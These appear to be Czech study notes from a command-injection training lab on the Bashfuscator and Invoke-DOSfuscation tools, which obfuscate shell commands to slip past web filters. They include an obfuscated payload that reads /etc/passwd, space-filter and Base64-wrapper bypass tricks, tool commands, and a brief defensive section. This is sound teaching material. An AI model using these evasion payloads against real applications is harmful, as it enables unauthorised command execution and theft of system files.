Automatizované nástroje jako **Bashfuscator** (pro Linux) a **Invoke-DOSfuscation** (pro Windows) posouvají obcházení filtrů na vyšší úroveň. Zatímco manuální obfuscace spoléhá na jednoduché úpravy (uvozovky, proměnné), tyto nástroje aplikují vícevrstvé mutace, dynamické pole znaků a matematické operace, čímž vytvoří payload, který je pro statické WAFy a IDS signatury prakticky nerozpoznatelný.

### 🧩 Řešení cvičení z modulu: Proč základní výstup z Bashfuscatoru selhal?

Pokud vezmete výchozí vygenerovaný payload z příkladu:

Bash

```
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

A vložíte jej do testované webové aplikace, požadavek často **selže**. Zde jsou **3 hlavní důvody, proč k tomu dochází**:

1. **Přítomnost filtrů mezer:** Vygenerovaný kód obsahuje klasické mezery (např. mezi `for Ll in ...` nebo v deklaraci pole `W0=(...)`). Webová aplikace mezery blokuje.
    
2. **Nekompatibilita Shellu (`/bin/sh` vs `/bin/bash`):**
    
    - Webové servery (např. PHP funkce `system()` nebo `exec()`) spouštějí příkazy přes výchozí systémový shell `/bin/sh` (což bývá na Debianu/Ubuntu **Dash**).
        
    - Výše uvedený payload využívá **Bash-specific syntaxi** (rozšířená pole `W0=(...)`). V prostředí `/bin/sh` tento kód skončí syntaktickou chybou (`Syntax error: Bad substitution`).
        
3. **Blacklist klíčových slov:** Příkaz obsahuje slova jako `eval` nebo `printf`, která mohou být na blacklistu aplikace.
    

#### 💡 Jak získejte funkční payload z Bashfuscatoru?

- **Ošetření mezer:** Všechny mezery ve vygenerovaném kódovém bloku nahraďte tabulátory (`%09`) nebo použijte příslušné parametry pro úpravu výstupu.
    
- **Vynucení interpretu Bash:** Předvolejte spuštění přes `bash` pomocí kódování do Base64, aby se kód vyhodnotil v plnohodnotném prostředí Bash:
    
    Bash
    
    ```
    # 1. Vygenerovaný Bashfuscator payload zakódujte do Base64
    # 2. Předající příkaz v aplikaci spustí: bash<<<$(base64%09-d<<<PASTE_B64)
    ```
    

### 🛠️ 1. Bashfuscator (Linux / Bash)

**Bashfuscator** je modulární framework v Pythonu určený k automatickému generování obfuscovaných Bash příkazů a skriptů. Využívá náhodné kombinace kódovačů, kompresorů a mutátorů.

#### 🚀 Základní příkazy a ovládání:

- **Zobrazení nápovědy a možností:**
    
    Bash
    
    ```
    ./bashfuscator -h
    ```
    
- **Výpis všech dostupných modulů (obfuscatory, encoders, mutators):**
    
    Bash
    
    ```
    ./bashfuscator -l
    ```
    
- **Základní obfuscace příkazu (náhodný výběr technik):**
    
    Bash
    
    ```
    ./bashfuscator -c 'cat /etc/passwd'
    ```
    
- **Vygenerování kratšího / jednoduššího payloadu:**
    
    Bash
    
    ```
    ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
    ```
    
    - `-s 1` / `--size 1`: Určuje úroveň velikosti výstupu (1 = nejmenší).
        
    - `-t 1` / `--time 1`: Určuje náročnost/délku generování.
        
    - `--layers 1`: Počet vrstev obfuscace (čím méně vrstev, tím kratší payload).
        
    - `--no-mangling`: Zamezí nadbytečnému komprimování a deformaci proměnných.
        
- **Osobitý výběr konkrétního kódování (např. Base64):**
    
    Bash
    
    ```
    ./bashfuscator -c 'whoami' --choose-encoders Encode/Base64
    ```
    

### 🛠️ 2. DOSfuscation / Invoke-DOSfuscation (Windows / CMD & PowerShell)

**Invoke-DOSfuscation** je interaktivní PowerShell nástroj pro obfuscaci příkazů určených pro `cmd.exe` a `powershell.exe`. Využívá inherentních vlastností interpretu příkazového řádku Windows (např. ořezávání systémových proměnných nebo vkládání znaků `^`).

#### 🚀 Základní příkazy a ovládání:

1. **Spuštění nástroje v PowerShellu:**
    
    PowerShell
    
    ```
    Import-Module .\Invoke-DOSfuscation.psd1
    Invoke-DOSfuscation
    ```
    
2. **Interaktivní nápověda:**
    
    DOS
    
    ```
    Invoke-DOSfuscation> HELP
    Invoke-DOSfuscation> TUTORIAL
    ```
    
3. **Nastavení cílového příkazu:**
    
    DOS
    
    ```
    Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
    ```
    
4. **Výběr kategorie obfuscace:**
    
    - **`ENCODING`** – Kódování přes proměnné prostředí (Environment Variable Encoding).
        
    - **`PAYLOAD`** – Obfuscace celých payloadů.
        
    - **`COMMAND`** – Obfuscace jednotlivých příkazů a jejich argumentů.
        
5. **Aplikace metody:**
    
    DOS
    
    ```
    Invoke-DOSfuscation> encoding
    Invoke-DOSfuscation\Encoding> 1
    ```
    
6. **Obnovení / Zrušení nastavení:**
    
    DOS
    
    ```
    Invoke-DOSfuscation> RESET
    ```
### 📊 Srovnání: Bashfuscator vs. Invoke-DOSfuscation

|Nástroj|Cílový operační systém|Hlavní obfuscační techniky|Výstupní prostředí|
|---|---|---|---|
|**Bashfuscator**|Linux (Bash)|Token randomization, String reversal, Compression, Random variable assignments (`ForCode`)|Spustitelný Bash skript / příkaz|
|**Invoke-DOSfuscation**|Windows (CMD / PowerShell)|Slicing prostředí (`%TEMP:~-3,-2%`), Concatenation, Special character encoding (`^`)|Syntaxe pro `cmd.exe` nebo `powershell.exe`|

### 🛡️ Jak se proti obfuscovaným příkazům bránit (Defenzivní pohled)

Detekovat obfuscované příkazy na úrovni vstupních řetězců (WAF/Blacklist) je dlouhodobě neudržitelné. Účinná obrana vyžaduje:

- **Pramenitá prevence:** Nepoužívat systémové příkazové řádky pro zpracování uživatelských vstupů (využít přímá API daného jazyka místo `exec()`).
    
- **Behaviorální analýza (EDR/Logging):** Monitorovat procesní strom (Process Execution Logging). I když je příkaz jakkoliv zamžen, v momentě spuštění OS vytvoří podproces (např. `cat /etc/passwd`), který je na úrovni jádra OS okamžitě viditelný.
    

Gratuluji k dokončení celé teoretické i praktické části modulu Command Injection! Jak chcete pokračovat dále?

Metodika a rozhodovací strom pro Skills Assessment

Defenzivní opravy kódu (Secure Coding & Remediation)

### 💡 Řešení cvičení: Proč vygenerovaný payload v aplikaci selhal?

Pokud vložíte standardní výstup z Bashfuscatoru do testované aplikace, požadavek selže ze dvou hlavních důvodů:

1. **Obsahuje mezery:** Vygenerovaný skript v sobě má mezery (např. v cyklech `for` a deklaracích polí), které aplikační filtr blokuje.
    
2. **Inkompatibilita shellu (`/bin/sh` vs `/bin/bash`):** Webový server spouští příkazy v minimalistickém `/bin/sh` (v Ubuntu reprezentovaný shellem Dash), který nepodporuje rozšířenou Bash syntaxi polí `W0=(...)`.
    

**Správný postup pro vytvoření funkčního payloadu:**

1. Zabalte vygenerovaný příkaz do prostředí Bash nebo použijte Base64 kódování celého bloku.
    
2. Nahraďte všechny mezery ve finálním dotazu tabulátory (`%09`) nebo `${IFS}`.

